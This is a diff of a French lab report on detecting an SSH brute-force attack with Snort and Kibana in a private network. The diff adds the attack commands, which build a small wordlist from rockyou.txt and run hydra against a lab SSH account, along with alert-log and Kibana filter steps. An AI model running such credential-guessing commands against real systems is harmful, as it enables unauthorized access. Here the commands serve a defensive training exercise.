@@ -11,12 +11,16 @@ de l'IDS à détecter un grand nombre de tentatives de connexion rapprochées ve
 de la même source.
 
 ## Commande lancée (depuis Kali)
+```bash
+head -n 200 /usr/share/wordlists/rockyou.txt > /home/kali/petite-liste.txt
+echo "azerty123" >> /home/kali/petite-liste.txt
+hydra -l vboxuser -P /home/kali/petite-liste.txt -t 4 ssh://192.168.56.10
+```
+Si `rockyou.txt` est compressé : `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
 
-<img width="654" height="40" alt="image" src="https://github.com/user-attachments/assets/3e46fa12-d8f9-40cc-ad6b-ffabe57c0085" />
+Hydra finit par trouver le mot de passe, ce qui confirme l'intrusion :
 
-Cependant, le brute force étant une méthode exaustive et longue, on utilise un .txt plus alléger histoire que l'attaque ne dure pas une éternité : 
-
-<img width="648" height="118" alt="image" src="https://github.com/user-attachments/assets/a24a3090-f21b-425e-b9ee-47c8318f64d3" />
+![Attaque hydra réussie](../screenshots/brute-ssh.png)
 
 ## Règle de détection (Snort)
 
@@ -29,12 +33,18 @@ même source en 10 secondes.
 
 ## Logs collectés (/var/log/snort/alert)
 
-<img width="1855" height="162" alt="image" src="https://github.com/user-attachments/assets/08155e9a-b3e7-4b68-85a3-53f33bdabd0b" />
-
-Complété côté cible par le journal `auth.log` (connexions SSH échouées), géré par P2.
+Alerte générée par Snort (`/var/log/snort/alert`) :
+```bash
+grep "SSH Brute Force" /var/log/snort/alert | tail -5
+```
+![Alerte Snort brute force](../screenshots/log-ssh-brute.png)
 
 ## Capture Kibana
-(P1?)
+Filtre : `snort.signature : "SSH Brute Force attempt"`
+
+![Détection dans Kibana](../screenshots/ssh-brute-detecte.png)
+
+On voit l'attaquant `192.168.56.20` lancer de nombreuses connexions vers la cible `192.168.56.10` sur le port 22, en quelques secondes.
 
 ## E-mail reçu
 (P4?)
